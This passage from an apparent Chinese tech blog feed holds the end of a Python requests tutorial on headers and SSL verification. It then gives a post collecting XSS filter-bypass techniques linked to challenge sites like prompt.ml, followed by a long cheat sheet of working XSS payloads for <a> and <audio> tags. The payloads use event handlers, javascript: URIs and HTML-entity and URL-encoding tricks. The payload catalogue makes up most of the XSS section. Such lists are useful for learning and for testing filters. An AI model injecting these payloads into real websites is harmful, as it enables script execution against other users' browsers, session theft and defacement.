<span class="string">'3080'</span>, <span class="string">'content-language'</span>: <span class="string">'en'</span>, <span class="string">'vary'</span>: <span class="string">'Accept-Encoding,Cookie'</span>,</span><br><span class="line"><span class="string">'server'</span>: <span class="string">'Apache'</span>, <span class="string">'last-modified'</span>: <span class="string">'Wed, 13 Jun 2012 01:33:50 GMT'</span>,</span><br><span class="line"><span class="string">'connection'</span>: <span class="string">'close'</span>, <span class="string">'cache-control'</span>: <span class="string">'private, s-maxage=0, max-age=0,</span></span><br><span class="line"><span class="string">must-revalidate'</span>, <span class="string">'date'</span>: <span class="string">'Thu, 14 Jun 2012 12:59:39 GMT'</span>, <span class="string">'content-type'</span>:</span><br><span class="line"><span class="string">'text/html; charset=UTF-8'</span>, <span class="string">'x-cache-lookup'</span>: <span class="string">'HIT from cp1006.eqiad.wmnet:3128,</span></span><br><span class="line"><span class="string">MISS from cp1010.eqiad.wmnet:80'</span>&#125;</span><br></pre></td></tr></table></figure><p>然而，如果想得到发送到服务器的请求的头部，我们可以简单地访问该请求，然后是该请求的头部：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>r.request.headers</span><br><span class="line">&#123;<span class="string">'Accept-Encoding'</span>: <span class="string">'identity, deflate, compress, gzip'</span>,</span><br><span class="line"><span class="string">'Accept'</span>: <span class="string">'*/*'</span>, <span class="string">'User-Agent'</span>: <span class="string">'python-requests/0.13.1'</span>&#125;</span><br></pre></td></tr></table></figure><h4 id="23-准备的请求-prepared-request"><a class="markdownIt-Anchor" href="#23-准备的请求-prepared-request"></a> <code>2.3 准备的请求 （Prepared Request）</code></h4><p>目前忽略</p><h4 id="24-ssl-证书验证"><a class="markdownIt-Anchor" href="#24-ssl-证书验证"></a> <code>2.4 SSL 证书验证</code></h4><p>Requests 可以为 HTTPS 请求验证 SSL 证书，就像 web 浏览器一样。SSL 验证默认是开启的，如果证书验证失败，Requests 会抛出 SSLError:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>requests.get(<span class="string">'https://requestb.in'</span>)</span><br><span class="line">requests.exceptions.SSLError: hostname <span class="string">'requestb.in'</span> doesn<span class="string">'t match either of '</span>*.herokuapp.com<span class="string">', '</span>herokuapp.com<span class="string">'</span></span><br></pre></td></tr></table></figure><p>在该域名上我没有设置 SSL，所以失败了。但 Github 设置了 SSL:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>requests.get(<span class="string">'https://github.com'</span>, verify=<span class="keyword">True</span>)</span><br><span class="line">&lt;Response [<span class="number">200</span>]&gt;</span><br></pre></td></tr></table></figure><p>你可以为 <code>verify</code> 传入 CA_BUNDLE 文件的路径，或者包含可信任 CA 证书文件的文件夹路径：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>requests.get(<span class="string">'https://github.com'</span>, verify=<span class="string">'/path/to/certfile'</span>)</span><br></pre></td></tr></table></figure><p>或者将其保持在会话中：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">s = requests.Session()</span><br><span class="line">s.verify = <span class="string">'/path/to/certfile'</span></span><br></pre></td></tr></table></figure><blockquote><p>注解：如果 <code>verify</code> 设为文件夹路径，文件夹必须通过 OpenSSL 提供的 c_rehash 工具处理</p></blockquote><p>你还可以通过 <code>REQUESTS_CA_BUNDLE</code> 环境变量定义可信任 CA 列表。</p><p>如果你将 <code>verify</code> 设置为 False，Requests 也能忽略对 SSL 证书的验证。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>requests.get(<span class="string">'https://kennethreitz.org'</span>, verify=<span class="keyword">False</span>)</span><br><span class="line">&lt;Response [<span class="number">200</span>]&gt;</span><br></pre></td></tr></table></figure><p># 对于私有证书，你也可以传递一个 CA_BUNDLE 文件的路径给 <code>verify</code>。你也可以设置 # <code>REQUEST_CA_BUNDLE</code> 环境变量。</p><blockquote><p>其他相关requests内容请见<a href="https://requests.readthedocs.io/zh_CN/latest/" target="_blank" rel="noopener">Requests库中文官方文档</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;首先来看一下基本第三方库有什么？&lt;/p&gt;
&lt;/blockquote&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th style=&quot;text-align:center&quot;&gt;库名&lt;/th&gt;
&lt;th style=&quot;text-align:center&quot;&gt;
      
    
    </summary>
    
    
      <category term="基础知识" scheme="https://muzibing.github.io/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    
      <category term="python" scheme="https://muzibing.github.io/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>xss_payload_构造总结及深度剖析(持续更新中……)</title>
    <link href="https://muzibing.github.io/2020/03/09/2020.03.08%EF%BC%88100%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/03/09/2020.03.08（100）/</id>
    <published>2020-03-08T16:00:00.000Z</published>
    <updated>2020-03-14T14:26:54.173Z</updated>
    
    <content type="html"><![CDATA[<h3 id="一-绕过-xss-filter-的方法"><a class="markdownIt-Anchor" href="#一-绕过-xss-filter-的方法"></a> 一、绕过 XSS Filter 的方法</h3><h4 id="1逃离-的束缚"><a class="markdownIt-Anchor" href="#1逃离-的束缚"></a> 1.逃离 <code>&quot;&quot;</code> 的束缚</h4><p>※ <code>普通的闭合</code></p><blockquote><p>有的并没有进行过滤，只需要简单的闭合即可逃离；</p></blockquote><p>※ <code>利用反引号代替</code></p><blockquote><p>条件：过滤掉 “”。在 <code>IE</code> 浏览器下，用 `` 代替 &quot; &quot;，以到达闭合的作用；</p></blockquote><p>※ <code>利用换行的特性</code></p><blockquote><p>详情见 <code>prompt.ml</code> 0x08 题目</p></blockquote><h4 id="2-和-过滤类型的题目"><a class="markdownIt-Anchor" href="#2-和-过滤类型的题目"></a> 2.<code>&lt;</code> 和 <code>/&gt;</code> 过滤类型的题目</h4><p>※ <code>利用事件触发 payload</code></p><blockquote><p>虽然不能产生新的标签，但是可以在已经存在的标签（如svg、input、img、script等）内部添加 <code>on+event</code> 事件（onclick、onerror、onload、onmouseup、onmousedown等）</p><p><code>相关题目</code>：<a href="%5Bhttps://muzibing.github.io/2020/03/08/2020.03.08%EF%BC%8899%EF%BC%89/#font-color-navy0x06-input-%E6%A0%87%E7%AD%BE%E5%86%85%E9%83%A8-js-%E4%BA%8B%E4%BB%B6font%5D(https://muzibing.github.io/2020/03/08/2020.03.08%EF%BC%8899%EF%BC%89/#font-color-navy0x06-input-%E6%A0%87%E7%AD%BE%E5%86%85%E9%83%A8-js-%E4%BA%8B%E4%BB%B6font)">xss challenges_0x06</a>、</p></blockquote><p>※ <code>利用题目中给出的函数进行绕过</code></p><blockquote><p>可以根据代码中相关函数的特性进行绕过；</p><p><code>相关题目</code>：<a href="%5Bhttps://muzibing.github.io/2020/02/27/2020.02.27%EF%BC%8896%EF%BC%89/#font-color-navy0x01-%E6%A0%87%E7%AD%BE%E9%97%AD%E5%90%88font%5D(https://muzibing.github.io/2020/02/27/2020.02.27%EF%BC%8896%EF%BC%89/#font-color-navy0x01-%E6%A0%87%E7%AD%BE%E9%97%AD%E5%90%88font)">prompt.ml_0x01</a></p></blockquote><h4 id="3onevent-的过滤"><a class="markdownIt-Anchor" href="#3onevent-的过滤"></a> 3.<code>on+event</code> 的过滤</h4><p>※ <code>通过伪协议来完成payload</code></p><blockquote><p>虽然不能通过 <code>on+event</code> 来完成 js 事件的出发，但是可以通过伪协议 <code>javascript:</code> 来构造。</p><p><code>相关题目</code>：<a href="%5Bhttps://muzibing.github.io/2020/03/08/2020.03.08%EF%BC%8899%EF%BC%89/#font-color-navy0x0b-%E4%BC%AA%E5%8D%8F%E8%AE%AEfont%5D(https://muzibing.github.io/2020/03/08/2020.03.08%EF%BC%8899%EF%BC%89/#font-color-navy0x0b-%E4%BC%AA%E5%8D%8F%E8%AE%AEfont)">XSS challenges</a></p></blockquote><h4 id="4onevent-的过滤"><a class="markdownIt-Anchor" href="#4onevent-的过滤"></a> 4.<code>on+event =</code> 的过滤</h4><p>※ <code>通过换行进行绕过</code></p><blockquote><p>可以利用 js 事件与<code>=</code>不在同一行上，也能被成功解析的特性来绕过，举个例子：</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a</span><br><span class="line">= <span class="string">'hello xss'</span>;</span><br><span class="line">alert(a);</span><br></pre></td></tr></table></figure><blockquote><p><code>相关题目</code>：<a href="%5Bhttps://muzibing.github.io/2020/02/27/2020.02.27%EF%BC%8896%EF%BC%89/#font-color-navy0x05-%E5%B1%9E%E6%80%A7%E8%A6%86%E7%9B%96%E5%8F%8A%E6%8D%A2%E8%A1%8C%E7%BB%95%E8%BF%87font%5D(https://muzibing.github.io/2020/02/27/2020.02.27%EF%BC%8896%EF%BC%89/#font-color-navy0x05-%E5%B1%9E%E6%80%A7%E8%A6%86%E7%9B%96%E5%8F%8A%E6%8D%A2%E8%A1%8C%E7%BB%95%E8%BF%87font)">prompt.ml_0x05</a></p></blockquote><h4 id="5对标识符关键词字符串进行过滤或者替换"><a class="markdownIt-Anchor" href="#5对标识符关键词字符串进行过滤或者替换"></a> 5.对标识符/关键词/字符串进行过滤或者替换</h4><p>※ <code>利用过滤规则进行绕过</code></p><blockquote><p>要利用好题目中给出的规则，来达到绕过的目的，一般是删除某些标识符：<code>svg</code>、 <code>script</code> 、<code>alert</code>等，我们可以利用双写的形式进行绕过：<code>svsvgg</code>、<code>scriscriptpt</code>、<code>alealertrt</code>的形式达到绕过的目的。</p><p><code>相关题目</code>：<a href="%5Bhttps://muzibing.github.io/2020/03/08/2020.03.08%EF%BC%8899%EF%BC%89/#font-color-navy0x0a-%E5%AD%97%E7%AC%A6%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87font%5D(https://muzibing.github.io/2020/03/08/2020.03.08%EF%BC%8899%EF%BC%89/#font-color-navy0x0a-%E5%AD%97%E7%AC%A6%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87font)">xss challenges_0x0A</a></p></blockquote><p>※ <code>利用 script 的大小写不敏感的特性</code></p><blockquote><p>有些题目会对 script 进行过滤（前提是区分大小写），这时我们可以利用 <code>script</code> 标签大小写不敏感的特性来绕过，如将<code>script</code>变为<code>xscript</code>，我们可以输入<code>SCRipt</code>。</p><p><code>相关题目</code>：暂无</p></blockquote><p>※ <code>利用编码进行绕过</code></p><blockquote><p>根据题目的规则，进行相应的<a href="%5Bhttps://muzibing.github.io/2020/02/24/2020.02.24%EF%BC%8895%EF%BC%89/%5D(https://muzibing.github.io/2020/02/24/2020.02.24%EF%BC%8895%EF%BC%89/)">HTML 编码、URI 编码和Javascript 编码</a>，其中对<code>javascript:</code> 进行实体编码来绕过的方法很有用。</p><p><code>相关题目</code>：<a href="%5Bhttps://muzibing.github.io/2020/03/08/2020.03.08%EF%BC%8899%EF%BC%89/#font-color-navy0x0b-%E4%BC%AA%E5%8D%8F%E8%AE%AEfont%5D(https://muzibing.github.io/2020/03/08/2020.03.08%EF%BC%8899%EF%BC%89/#font-color-navy0x0b-%E4%BC%AA%E5%8D%8F%E8%AE%AEfont)">xss challenges_0x0B</a></p><p>如果再对 <code>(</code> 和 <code>=</code>进行过滤，那么又只能在<code>&lt;script&gt;</code>标签内部执行函数的话，还只能通过实体编码绕过，那么就需要用到一个标签 <a href="%5Bhttps://muzibing.github.io/2020/02/24/2020.02.24%EF%BC%8895%EF%BC%89/#%E4%B8%89%E3%80%81%E8%AF%A6%E8%A7%A3%E6%AF%8F%E6%9D%A1%E5%8E%9F%E5%9B%A0%5D(https://muzibing.github.io/2020/02/24/2020.02.24%EF%BC%8895%EF%BC%89/#%E4%B8%89%E3%80%81%E8%AF%A6%E8%A7%A3%E6%AF%8F%E6%9D%A1%E5%8E%9F%E5%9B%A0)"><code>&lt;svg&gt;</code>的特性</a></p><p><code>相关题目</code>：<a href="%5Bhttps://muzibing.github.io/2020/03/08/2020.03.08%EF%BC%8899%EF%BC%89/#font-color-navy0x0b-%E4%BC%AA%E5%8D%8F%E8%AE%AEfont%5D(https://muzibing.github.io/2020/03/08/2020.03.08%EF%BC%8899%EF%BC%89/#font-color-navy0x0b-%E4%BC%AA%E5%8D%8F%E8%AE%AEfont)">prompt.ml_0x02</a></p></blockquote><h4 id="6touppercase-的过滤"><a class="markdownIt-Anchor" href="#6touppercase-的过滤"></a> 6.<code>toUppercase()</code> 的过滤</h4><p>※ <code>利用unicode或js隐式转换</code></p><blockquote></blockquote><h3 id="二-各标签常见的-xss-payload"><a class="markdownIt-Anchor" href="#二-各标签常见的-xss-payload"></a> 二、各标签常见的 <code>xss payload</code></h3><p><code>按照字母书写顺序进行排列</code></p><h4 id="a标签"><a class="markdownIt-Anchor" href="#a标签"></a> ◈ <code>&lt;a&gt;</code>标签</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">+++++++++++++++++ 十六进制编码实体 ++++++++++++++++++</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript:alert(/xss/)"</span>&gt;</span>/xss/<span class="tag">&lt;/<span class="name">a</span>&gt;</span> // javascript不区分大小写</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&amp;#x6A;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3A;&amp;#x61;&amp;#x6C;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x2F;&amp;#x78;&amp;#x73;&amp;#x73;&amp;#x2F;&amp;#x29;"</span>&gt;</span>/xss/<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&amp;#x6A;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3A;%61%6c%65%72%74%28%2f%78%73%73%2f%29"</span>&gt;</span>/xss/<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&amp;#x6A;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3A;\u0061\u006c\u0065\u0072\u0074('\u002f\u0078\u0073\u0073\u002f')"</span>&gt;</span>/xss/<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">onclick</span>=<span class="string">alert(/xss/)</span>&gt;</span>/xss/<span class="tag">&lt;/<span class="name">a</span>&gt;</span> // 十六进制编码不区分大小写 </span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"     javascript:alert(1)"</span>&gt;</span>XSS<span class="tag">&lt;/<span class="name">a</span>&gt;</span> // 协议之前允许使用字符\x01-\x20</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javas    cript:alert(1)"</span>&gt;</span>XSS<span class="tag">&lt;/<span class="name">a</span>&gt;</span> // 协议中允许使用字符\x09（\t-&amp;Tab;），\x0a（\n-&amp;NewLine;），\x0d（\）</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript:x='&amp;percnt;27-alert(1)-%27';"</span>&gt;</span>XSS<span class="tag">&lt;/<span class="name">a</span>&gt;</span> // HTML实体和URL编码</span><br><span class="line">++++++++++++ 如果下一个字符不是a-f0-9，则不使用分号的十六进制编码 ++++++++++++</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"j&amp;#x61vascript:alert(1)"</span>&gt;</span>XSS<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&amp;#x6a</span></span></span><br><span class="line"><span class="tag"><span class="string">avascript:alert(1)"</span>&gt;</span>XSS<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&amp;#x6a avascript:alert(1)"</span>&gt;</span>XSS<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line">++++++++++++++++++++HTML 实体++++++++++++++++++++++++++++++++</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript&amp;colon;alert(1)"</span>&gt;</span>XSS<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"java&amp;Tab;script:alert(1)"</span>&gt;</span>XSS<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"java&amp;NewLine;script:alert(1)"</span>&gt;</span>XSS<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript&amp;colon;alert&amp;lpar;1&amp;rpar;"</span>&gt;</span>XSS<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">----------------------------------------------------</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript:x='%27-alert(1)-%27';"</span>&gt;</span>XSS<span class="tag">&lt;/<span class="name">a</span>&gt;</span> // 网址编码</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript:x='&amp;percnt;27-alert(1)-%27';"</span>&gt;</span>XSS<span class="tag">&lt;/<span class="name">a</span>&gt;</span> // HTML实体和URL编码</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span> <span class="attr">onclick</span>=<span class="string">eval(alert(/xss/))</span>&gt;</span>/xss/<span class="tag">&lt;/<span class="name">a</span>&gt;</span> // 需要点击一下元素（Chrome、Firefox、IE、Safari)</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">x</span> <span class="attr">tabindex</span>=<span class="string">1</span> <span class="attr">onactivate</span>=<span class="string">alert(1)</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span> // 激活元素时触发(IE)</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">x</span> <span class="attr">tabindex</span>=<span class="string">1</span> <span class="attr">onbeforeactivate</span>=<span class="string">alert(1)</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span> //在激活元素之前触发（IE）</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">onblur</span>=<span class="string">alert(1)</span> <span class="attr">tabindex</span>=<span class="string">1</span> <span class="attr">id</span>=<span class="string">x</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">autofocus</span>&gt;</span> // 当元素失去焦点时触发（Chrome、IE、Safari）</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">x</span> <span class="attr">tabindex</span>=<span class="string">1</span> <span class="attr">onfocus</span>=<span class="string">alert(1)</span>&gt;</span>/xss/<span class="tag">&lt;/<span class="name">a</span>&gt;</span> // 当元素具有焦点时触发（Chrome、IE、Safari)</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">x</span> <span class="attr">tabindex</span>=<span class="string">1</span> <span class="attr">onfocusin</span>=<span class="string">alert(1)</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span> // 当元素具有焦点时触发（Chrome、IE、Safari)</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">onbeforecopy</span>=<span class="string">"alert(1)"</span> <span class="attr">contenteditable</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span> // 需要复制一段文字（Chrome、Firefox、IE、Safari)</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">onbeforecut</span>=<span class="string">"alert(1)"</span> <span class="attr">contenteditable</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span> // 要求剪切一段文字（Chrome、Firefox、IE、Safari)</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">oncontextmenu</span>=<span class="string">"alert(1)"</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span> // 右键单击以显示上下文菜单时触发（Chrome、Firefox、IE、Safari)</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">oncopy</span>=<span class="string">"alert(1)"</span> <span class="attr">contenteditable</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span> // 需要复制一段文字（Chrome、Firefox、IE、Safari)</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">oncut</span>=<span class="string">"alert(1)"</span> <span class="attr">contenteditable</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span> // 要求剪切一段文字（Chrome、Firefox、IE、Safari)</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">onpaste</span>=<span class="string">"alert(1)"</span> <span class="attr">contenteditable</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span> // 需要粘贴一段文字（Chrome、Firefox、IE、Safari)</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">ondblclick</span>=<span class="string">"alert(1)"</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span> // 双击元素时触发（Chrome、Firefox、IE、Safari)</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">draggable</span>=<span class="string">"true"</span> <span class="attr">ondrag</span>=<span class="string">"alert(1)"</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span> // 触发拖动元素（Chrome、Firefox、IE、Safari)</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">draggable</span>=<span class="string">"true"</span> <span class="attr">ondragend</span>=<span class="string">"alert(1)"</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span> // 触发拖动已在元素上完成（Chrome、Firefox、IE、Safari)</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">draggable</span>=<span class="string">"true"</span> <span class="attr">ondragenter</span>=<span class="string">"alert(1)"</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span> // 需要鼠标拖动（Chrome、Firefox、IE、Safari)</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">draggable</span>=<span class="string">"true"</span> <span class="attr">ondragleave</span>=<span class="string">"alert(1)"</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span> // 同上</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">onkeydown</span>=<span class="string">"alert(1)"</span> <span class="attr">contenteditable</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span> // 按下键时触发（Chrome、Firefox、IE、Safari)</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">onkeypress</span>=<span class="string">"alert(1)"</span> <span class="attr">contenteditable</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span> // 同上</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">onkeyup</span>=<span class="string">"alert(1)"</span> <span class="attr">contenteditable</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span> // 释放按键时触发（Chrome、Firefox、IE、Safari)</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">onmousedown</span>=<span class="string">"alert(1)"</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span> // 按下鼠标时触发（Chrome、Firefox、IE、Safari)</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">onmouseenter</span>=<span class="string">"alert(1)"</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span> // 当鼠标悬停在元素上时触发（Chrome、Firefox、IE、Safari)</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">onmouseleave</span>=<span class="string">"alert(1)"</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span> // 当鼠标移离元素时触发（Chrome、Firefox、IE、Safari)</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">onmousemove</span>=<span class="string">"alert(1)"</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span> // 需要鼠标移动（Chrome、Firefox、IE、Safari)</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">onmouseout</span>=<span class="string">"alert(1)"</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span> // 当鼠标移离元素时触发（Chrome、Firefox、IE、Safari)</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">onmouseover</span>=<span class="string">"alert(1)"</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span> // 需要将鼠标悬停在元素上（Chrome、Firefox、IE、Safari)</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">onmouseup</span>=<span class="string">"alert(1)"</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span> // 释放鼠标按钮时触发（Chrome、Firefox、IE、Safari)</span><br></pre></td></tr></table></figure><h4 id="audio-标签"><a class="markdownIt-Anchor" href="#audio-标签"></a> ◈ <code>&lt;audio&gt;</code> 标签</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">audio</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(/xss/)</span>&gt;</span> // 资源加载失败或导致错误时触发（Chrome、Firefox、IE、Safari)</span><br><span class="line"><span class="tag">&lt;<span class="name">audio</span> <span class="attr">oncanplay</span>=<span class="string">alert(1)</span>&gt;</span><span class="tag">&lt;<span class="name">source</span> <span class="attr">src</span>=<span class="string">"horse.ogg"</span> <span class="attr">type</span>=<span class="string">"audio/wav"</span>&gt;</span><span class="tag">&lt;/<span class="name">audio</span>&gt;</span> // 如果资源可以播放则触发（Chrome、Firefox、IE、Safari) <span class="tag">&lt;<span class="name">video</span>&gt;</span> 标签也可以</span><br><span class="line"><span class="tag">&lt;<span class="name">audio</span> <span class="attr">controls</span> <span class="attr">autoplay</span> <span class="attr">onended</span>=<span class="string">alert(1)</span>&gt;</span><span class="tag">&lt;<span class="name">source</span> <span class="attr">src</span>=<span class="string">"mov_bbb.mp4"</span> <span class="attr">type</span>=<span class="string">"audio/wav"</span>&gt;</span><span class="tag">&lt;/<span class="name">audio</span>&gt;</span> // 资源播放完毕时触发（Chrome、Firefox、IE、Safari)</span><br><span class="line"><span class="tag">&lt;<span class="name">audio</span> <span class="attr">onloadeddata</span>=<span class="string">alert(1)</span> <span class="attr">controls</span>&gt;</span><span class="tag">&lt;<span class="name">source</span> <span class="attr">src</span>=<span class="string">"horse.mp3"</span> <span class="attr">type</span>=<span class="string">"audio/mp3"</span>&gt;</span><span class="tag">&lt;/<span 